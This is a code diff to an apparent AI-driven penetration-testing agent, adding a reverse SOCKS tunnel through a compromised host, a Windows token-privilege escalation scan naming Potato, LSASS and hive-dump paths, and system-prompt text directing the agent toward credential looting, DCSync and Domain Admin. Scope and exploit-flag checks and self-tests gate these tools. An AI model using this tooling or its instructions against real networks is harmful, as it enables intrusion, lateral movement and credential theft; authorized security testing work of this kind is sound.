@@ -47,7 +47,7 @@ STATUS_CONFIDENCE = {"verified": "confirmed", "potential": "unconfirmed",
 # make_payload, get_evidence) are NOT evidence of a condition on the target.
 EVIDENCE_TOOLS = {"http_probe", "run_command", "establish_foothold", "upload_shell",
                   "privesc_scan", "pivot_scan", "loot", "browse", "browser_action",
-                  "ad_recon", "ad_exec"}
+                  "ad_recon", "ad_exec", "win_privesc_scan"}
 
 _CVSS_VECTOR = re.compile(r"^CVSS:(2\.0|3\.0|3\.1|4\.0)/", re.I)
 
@@ -128,6 +128,7 @@ class Agent:
         self.shots: list[dict] = []  # screenshots captured this run → embedded in the report
         self.channel = None  # exec foothold once established
         self.proxies = None  # SOCKS tunnel through the foothold, once opened
+        self._reverse_tunnel = None  # Watson-side reverse-tunnel listeners, kept alive
         self.done = False    # the agent declares the assessment complete
         self.cancelled = False  # set when a graceful stop was requested mid-run
         self.authed = False  # an authenticated session is loaded (self.session carries it)
@@ -346,6 +347,23 @@ class Agent:
         return {"tunnel": self.proxies,
                 "note": "http_probe now routes through the foothold — probe IN-SCOPE internal hosts"}
 
+    def open_reverse_tunnel(self, callback_host: str = "", master_port: int = 8443,
+                            port: int = 1080) -> dict:
+        """Open a REVERSE tunnel: the foothold dials BACK to you. Use when the foothold is
+        behind NAT / an inbound firewall so open_tunnel can't reach it. http_probe then routes
+        through it exactly like open_tunnel."""
+        if not self.exploit:
+            return {"error": "requires exploitation to be enabled (--exploit)"}
+        if self.channel is None:
+            return {"error": "no foothold — call establish_foothold first"}
+        from .pivot import local_ip, open_reverse_socks
+        cb = callback_host or local_ip()
+        self._reverse_tunnel, self.proxies = open_reverse_socks(
+            self.channel, cb, socks_port=port, master_port=master_port)
+        return {"tunnel": self.proxies, "callback": f"{cb}:{master_port}",
+                "note": "the foothold dials BACK to you; http_probe now routes through it — "
+                        "probe IN-SCOPE internal hosts"}
+
     def pivot_scan(self) -> dict:
         """Map the internal network from the foothold (interfaces, neighbors, services)."""
         if not self.exploit:
@@ -376,7 +394,7 @@ class Agent:
         self.scope.require(target)
         from . import ad
         out = {"enum": ad.run(ad.smb_argv(target, user, password, nthash, domain,
-                              extra=["--shares", "--sessions", "--pass-pol", "--users"]))}
+                              extra=["--shares", "--loggedon-users", "--pass-pol", "--users"]))}
         if roast and user:
             out["kerberoast"] = ad.run(ad.kerberoast_argv(target, domain, user, password, nthash))
             out["asreproast"] = ad.run(ad.asreproast_argv(target, domain, user, password))
@@ -409,6 +427,26 @@ class Agent:
         res = ad.run(ad.exec_argv(target, command, user, password, nthash, domain, powershell))
         events.emit("ad_exec", target=target, cmd=command[:80])
         return res
+
+    def win_privesc_scan(self, target: str, domain: str = "", user: str = "", password: str = "",
+                         nthash: str = "") -> dict:
+        """Enumerate token privileges and group memberships on an in-scope owned Windows host
+        (whoami /priv, /groups) and return matched local-to-SYSTEM / credential-theft paths
+        (the Windows counterpart of privesc_scan). Runs over the network via nxc; needs creds."""
+        if not self.exploit:
+            return {"error": "requires exploitation to be enabled (--exploit)"}
+        if self.scope.mode == "static":
+            return {"error": "static mode: no network"}
+        self.scope.require(target)
+        from . import ad, winprivesc
+        run = lambda cmd: ad.run(ad.exec_argv(target, cmd, user, password, nthash, domain)).get("output", "")
+        profile = winprivesc.enumerate_host(run)
+        cands = winprivesc.candidates(profile)
+        events.emit("win_privesc_scan", target=target, candidates=len(cands))
+        return {"whoami": (profile.get("whoami", "") or "")[:200],
+                "priv": (profile.get("priv", "") or "")[:800],
+                "groups_sample": "\n".join((profile.get("groups", "") or "").splitlines()[:20]),
+                "win_privesc_candidates": cands[:12]}
 
     def browse(self, url: str,
                question: str = "Identify login forms, inputs, notable features, and the tech stack.") -> dict:
@@ -483,7 +521,9 @@ class Agent:
                   "browse": self.browse, "browser_action": self.browser_action,
                   "upload_shell": self.upload_shell, "make_payload": self.make_payload,
                   "pivot_scan": self.pivot_scan, "open_tunnel": self.open_tunnel,
-                  "ad_recon": self.ad_recon, "ad_exec": self.ad_exec}.get(name)
+                  "open_reverse_tunnel": self.open_reverse_tunnel,
+                  "ad_recon": self.ad_recon, "ad_exec": self.ad_exec,
+                  "win_privesc_scan": self.win_privesc_scan}.get(name)
             if not fn:
                 result = {"error": f"unknown tool {name}"}
             else:
@@ -609,6 +649,17 @@ TOOLS = [
             "host": {"type": "string", "description": "foothold host reachable from here (default: target)"},
             "port": {"type": "integer"}}}}},
     {"type": "function", "function": {
+        "name": "open_reverse_tunnel",
+        "description": "Open a REVERSE tunnel when the foothold is behind NAT or an inbound "
+                       "firewall and open_tunnel can't reach it: the foothold connects BACK to you, "
+                       "and http_probe then routes through it to IN-SCOPE internal hosts (same effect "
+                       "as open_tunnel). Requires a foothold.",
+        "parameters": {"type": "object", "properties": {
+            "callback_host": {"type": "string",
+                              "description": "your address the foothold can reach (default: auto-detected)"},
+            "master_port": {"type": "integer", "description": "port the foothold dials back to (default 8443)"},
+            "port": {"type": "integer", "description": "local SOCKS port probes use (default 1080)"}}}}},
+    {"type": "function", "function": {
         "name": "ad_recon",
         "description": "Active Directory / Windows recon over the network (via nxc). Enumerate an "
                        "IN-SCOPE host or DC: SMB host info, shares, sessions, password policy, and "
@@ -635,6 +686,21 @@ TOOLS = [
             "password": {"type": "string"}, "nthash": {"type": "string"},
             "dump": {"type": "boolean"}, "just_dc": {"type": "boolean"},
             "powershell": {"type": "boolean"}},
+            "required": ["target"]}}},
+    {"type": "function", "function": {
+        "name": "win_privesc_scan",
+        "description": "Windows local privilege escalation on an IN-SCOPE host you can already run "
+                       "commands on (via creds/nxc): enumerate token privileges (whoami /priv) and "
+                       "group memberships (whoami /groups), returning matched local-to-SYSTEM paths "
+                       "(SeImpersonate->Potato, SeBackup->hive dump, SeDebug->LSASS, Backup/Server "
+                       "Operators, DnsAdmins, ...). The Windows counterpart of privesc_scan. Then "
+                       "confirm a candidate with ad_exec and check for nt authority\\system. Requires "
+                       "exploitation.",
+        "parameters": {"type": "object", "properties": {
+            "target": {"type": "string", "description": "in-scope Windows host/IP you have creds for"},
+            "domain": {"type": "string"}, "user": {"type": "string"},
+            "password": {"type": "string"},
+            "nthash": {"type": "string", "description": "NT hash for pass-the-hash instead of a password"}},
             "required": ["target"]}}},
     {"type": "function", "function": {
         "name": "browse",
@@ -744,14 +810,19 @@ EXPLOIT_NOTE = (" EXPLOITATION IS AUTHORIZED AND ENABLED. Actively try to break 
                 "escalation won't always be listed. Keep going until you are root or out of leads. "
                 "Once you have a foothold, call pivot_scan to map the internal network and reach "
                 "other IN-SCOPE internal hosts via run_command (curl/nc through the foothold), or "
-                "open_tunnel to route http_probe through the foothold and attack internal web hosts. "
+                "open_tunnel to route http_probe through the foothold and attack internal web hosts "
+                "(use open_reverse_tunnel instead when the foothold is behind NAT / can't accept "
+                "inbound and open_tunnel can't reach it). "
                 "After the foothold, and again once root, call loot to capture credentials, keys, "
                 "and proof files (root.txt/user.txt) and record notable captures as findings. "
                 "For an IN-SCOPE Windows / Active Directory target, use ad_recon to enumerate it "
                 "(null session first, then with any credentials you loot or are given), roast "
                 "accounts and collect BloodHound; then ad_exec to move laterally (run commands) or "
-                "dump secrets (secretsdump; just_dc for a DCSync). The objective is Domain Admin / "
-                "the krbtgt hash — keep chaining credentials across hosts until you reach it.")
+                "dump secrets (secretsdump; just_dc for a DCSync). Once you can run commands on a "
+                "Windows host, call win_privesc_scan to map its token privileges / group memberships "
+                "to a local-to-SYSTEM path (e.g. SeImpersonate -> Potato), confirm it with ad_exec, "
+                "and check for nt authority\\system. The objective is Domain Admin / the krbtgt hash "
+                "— keep chaining credentials across hosts until you reach it.")
 
 
 def _inventory_json(inv: dict) -> dict:
@@ -984,6 +1055,8 @@ if __name__ == "__main__":  # self-check: python -m watson.agent (tool gating, o
     assert "no foothold" in exp.pivot_scan()["error"]
     assert "requires exploitation" in dev.open_tunnel()["error"]
     assert "no foothold" in exp.open_tunnel()["error"]
+    assert "requires exploitation" in dev.open_reverse_tunnel()["error"]
+    assert "no foothold" in exp.open_reverse_tunnel()["error"]
     assert "requires exploitation" in dev.loot()["error"]
     assert "no foothold" in exp.loot()["error"]
 
@@ -993,6 +1066,10 @@ if __name__ == "__main__":  # self-check: python -m watson.agent (tool gating, o
     assert "out of scope" in exp.dispatch("ad_recon", {"target": "10.9.9.9"})["error"]
     assert "destructive" in exp.ad_exec("127.0.0.1", command="shutdown /s")["error"]
     assert "pass a command" in exp.ad_exec("127.0.0.1")["error"]  # no command, no dump
+
+    # Phase 8b Windows local privesc: exploit-gated and scope-gated (no network touched)
+    assert "requires exploitation" in dev.win_privesc_scan("127.0.0.1")["error"]
+    assert "out of scope" in exp.dispatch("win_privesc_scan", {"target": "10.9.9.9"})["error"]
 
     class _Dummy:
         kind = "test"
